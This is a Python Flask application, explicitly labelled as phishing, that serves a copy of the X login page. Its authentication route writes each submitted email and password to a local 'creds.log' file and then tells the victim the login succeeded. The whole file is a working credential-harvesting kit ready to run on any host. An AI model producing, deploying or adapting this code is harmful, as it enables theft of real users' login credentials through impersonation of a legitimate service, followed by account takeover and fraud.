import os
from flask import Flask, request, render_template_string

app = Flask(__name__)

X_PHISHING_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #000000;           /* Solid black */
    color: #fff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}
        }
        .login-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 40px 30px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            text-align: center;
        }
        h2 {
            margin-bottom: 30px;
            font-size: 28px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            margin: 12px 0;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.15);
            color: white;
        }
        input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }
        button {
            width: 100%;
            padding: 14px;
            margin-top: 20px;
            background: #1d9bf0;
            color: white;
            border: none;
            border-radius: 9999px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover {
            background: #1a8cd8;
        }
        @media screen and (max-width: 768px) {
            .login-container {
                padding: 30px 20px;
                max-width: 90%;
            }
            h2 { font-size: 24px; }
            input, button { font-size: 15px; padding: 13px 15px; }
            body { padding: 15px; }
        }
        @media screen and (max-width: 480px) {
            h2 { font-size: 22px; }
            button { padding: 12px; }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Welcome to X</h2>
        <form action="/x-auth" method="post">
            <input type="email" name="email" placeholder="Email or phone" required autofocus>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(X_PHISHING_TEMPLATE)

@app.route('/x-auth', methods=['POST'])
def authenticate():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    
    # Log credentials to file
    with open('creds.log', 'a') as f:
        f.write(f"{email}:{password}\n")
    
    return "Authentication successful"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)